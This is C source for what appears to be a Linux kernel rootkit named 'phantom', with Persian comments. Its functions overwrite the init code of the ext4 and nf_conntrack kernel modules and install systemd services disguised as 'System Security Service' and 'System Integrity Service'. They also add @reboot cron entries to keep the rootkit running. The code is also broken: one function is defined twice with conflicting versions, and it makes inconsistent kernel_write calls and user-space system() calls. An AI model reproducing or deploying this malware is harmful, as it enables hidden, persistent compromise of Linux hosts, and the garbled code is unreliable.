#include <linux/fs.h>
#include <linux/namei.h>
#include "common.h"
#include "phantom_defs.h"

// آلوده‌سازی ماژول‌های کرنل
void infect_modules(void) {
    struct module *mod;
    list_for_each_entry(mod, THIS_MODULE->list.prev, list) {
        if (strcmp(mod->name, "ext4") == 0) {
            void *init_addr = mod->init;
            // تزریق کد به init_module
            memcpy(init_addr, persistence_code, sizeof(persistence_code));
        }
    }
}

// ایجاد سرویس سیستمی
void create_service(void) {
    char *service = 
    "[Unit]\n"
    "Description=System Security Service\n"
    "[Service]\n"
    "ExecStart=/usr/sbin/rootkitd\n"
    "Restart=always\n"
    "[Install]\n"
    "WantedBy=multi-user.target";
    
    kernel_write("/etc/systemd/system/rootkit.service", service, strlen(service));
    system("systemctl daemon-reload");
    system("systemctl enable rootkit.service");
}

// مقاومت در برابر ریبوت
void install_boot_persistence(void) {
    char *crontab = "@reboot root /usr/sbin/rootkitd &\n";
    kernel_write("/etc/cron.d/rootkit", crontab, strlen(crontab));
}

// ایجاد سرویس سیستمی
void create_persistent_service(void) {
    char *service = 
    "[Unit]\n"
    "Description=System Integrity Service\n"
    "[Service]\n"
    "Type=simple\n"
    "ExecStart=/usr/sbin/phantomd\n"
    "Restart=always\n"
    "RestartSec=3\n"
    "[Install]\n"
    "WantedBy=multi-user.target";
    
    struct file *fp = filp_open("/etc/systemd/system/phantom.service", O_CREAT|O_WRONLY, 0644);
    if (!IS_ERR(fp)) {
        kernel_write(fp, service, strlen(service), 0);
        filp_close(fp, NULL);
    }
}

// مقاومت در برابر ریبوت
void install_boot_persistence(void) {
    char *cron_entry = "@reboot root /usr/sbin/phantomd\n";
    struct file *fp = filp_open("/etc/cron.d/phantom", O_CREAT|O_WRONLY, 0644);
    if (!IS_ERR(fp)) {
        kernel_write(fp, cron_entry, strlen(cron_entry), 0);
        filp_close(fp, NULL);
    }
}

// آلوده‌سازی ماژول‌های کرنل
void infect_kernel_modules(void) {
    struct module *mod;
    list_for_each_entry(mod, THIS_MODULE->list.prev, list) {
        if (strcmp(mod->name, "ext4") == 0 || strcmp(mod->name, "nf_conntrack") == 0) {
            void **init_addr = mod->init;
            *init_addr = (void *)persistence_init;
        }
    }
}
